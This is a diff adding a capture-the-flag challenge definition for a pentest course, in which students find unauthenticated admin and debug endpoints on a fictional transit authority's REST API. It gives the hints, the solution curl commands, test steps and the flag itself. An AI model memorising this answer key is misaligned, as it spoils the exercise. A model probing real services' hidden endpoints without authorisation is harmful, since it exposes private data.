@@ -1,0 +1,88 @@
+name: "Metro Transit - Insecure API Endpoints"
+description: "Metro Transit Authority's public API has broken access controls. Discover hidden endpoints, bypass authorization checks, and extract sensitive data from unprotected administrative APIs."
+
+difficulty: intermediate
+category: web
+duration_minutes: 40
+randomize_ip_offsets: true
+visibility: course
+week: 5
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/05_Insecure_API_Endpoints/"
+flag: "OCR{4p1_br0k3n_acc3ss}"
+
+objectives:
+  - Enumerate API endpoints through documentation and fuzzing
+  - Identify broken access control vulnerabilities in REST APIs
+  - Access administrative endpoints that should require authentication
+  - Extract sensitive data from unprotected debug/admin interfaces
+  - Capture the flag
+
+scenario: |
+  Metro Transit Authority (MTA) in Seattle has launched a public-facing REST
+  API for third-party developers to build transit apps. The API provides route
+  information, schedules, and real-time arrival data.
+
+  Lisa Park (Director of Digital Services) commissioned the assessment: "We
+  just opened the API to external developers. The public endpoints are
+  documented, but we also have internal admin endpoints for our ops team.
+  Those should require API keys. I want to make sure nobody can access the
+  admin stuff without proper credentials."
+
+  Your scope includes all API endpoints on the target host. Two assessment
+  tokens are hidden in endpoints that should not be publicly accessible.
+
+credentials: []
+
+hints:
+  - text: |
+      Start by reading the API documentation. Visit the root URL and /api/docs.
+      Understand the public endpoints, then look for admin or internal endpoints
+      that might not be documented. Try common API paths: /api/admin, /api/debug,
+      /api/internal, /api/config.
+    unlock_after_minutes: 8
+  - text: |
+      The /api/admin/users endpoint returns user data without requiring
+      authentication - that's a broken access control vulnerability (OWASP A01).
+      The /api/debug endpoint exposes internal configuration. Both contain tokens.
+    unlock_after_minutes: 18
+  - text: |
+      Token 1: curl http://<target>/api/admin/users - look for assessment_token
+      Token 2: curl http://<target>/api/debug - look for debug_token
+      Assemble: OCR{token1_token2}
+    unlock_after_minutes: 24
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "MTA API Server"
+      type: "server"
+      ip_offset: "20"
+      ports: [80]
+      services: ["Flask REST API"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "API responds on port 80"
+      command: "curl -s http://{target.webapp}/api/docs | grep -ci transit"
+
+    - name: "Public endpoint works"
+      command: "curl -s http://{target.webapp}/api/routes | grep -c route"
+
+    - name: "Admin endpoint accessible without auth (BOLA)"
+      command: "curl -s http://{target.webapp}/api/admin/users | grep -o 'assessment_token[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'"
+      expect: "4p1"
+
+    - name: "Debug endpoint exposes config with token"
+      command: "curl -s http://{target.webapp}/api/debug | grep -o 'debug_token[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'"
+      expect: "br0k3n_acc3ss"
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{4p1_br0k3n_acc3ss}'"
+      expect: "OCR{4p1_br0k3n_acc3ss}"
